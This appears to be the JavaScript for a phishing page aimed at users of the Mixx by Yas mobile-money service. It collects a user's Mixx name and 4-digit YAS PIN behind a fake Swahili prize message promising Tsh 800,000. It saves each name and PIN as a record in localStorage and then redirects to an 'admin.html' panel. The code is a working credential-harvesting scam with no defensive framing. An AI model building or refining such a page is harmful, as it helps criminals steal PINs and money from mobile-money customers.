// Handle form submission
document.getElementById('mixxForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const mixxName = document.getElementById('mixxName').value;
    const yasPin = document.getElementById('yasPin').value;

    // Validate inputs
    if (!mixxName.trim()) {
        showError('Please enter your Mixx name');
        return;
    }

    if (yasPin.length !== 4 || isNaN(yasPin)) {
        showError('YAS PIN must be exactly 4 digits');
        return;
    }

    // Create entry object
    const entry = {
        id: Date.now(),
        mixxName: mixxName,
        yasPin: yasPin,
        timestamp: new Date().toLocaleString('sw-TZ'),
        amount: 'Tsh 800,000'
    };

    // Get existing entries from localStorage
    let entries = JSON.parse(localStorage.getItem('mixxEntries')) || [];
    entries.push(entry);
    
    // Save to localStorage
    localStorage.setItem('mixxEntries', JSON.stringify(entries));

    // Show success message
    showSuccess(`Karibu ${mixxName}! Ombi lako limepokelewa. Zawadi yako: Tsh 800,000`);

    // Reset form
    document.getElementById('mixxForm').reset();

    // Redirect to admin panel after 2 seconds
    setTimeout(() => {
        window.location.href = 'admin.html';
    }, 2000);
});

function showSuccess(message) {
    const successDiv = document.createElement('div');
    successDiv.className = 'success-message';
    successDiv.textContent = message;
    successDiv.style.display = 'block';
    
    document.querySelector('.content').appendChild(successDiv);
    
    setTimeout(() => {
        successDiv.remove();
    }, 3000);
}

function showError(message) {
    const errorDiv = document.createElement('div');
    errorDiv.className = 'error-message';
    errorDiv.textContent = message;
    errorDiv.style.display = 'block';
    
    document.querySelector('.content').appendChild(errorDiv);
    
    setTimeout(() => {
        errorDiv.remove();
    }, 3000);
}
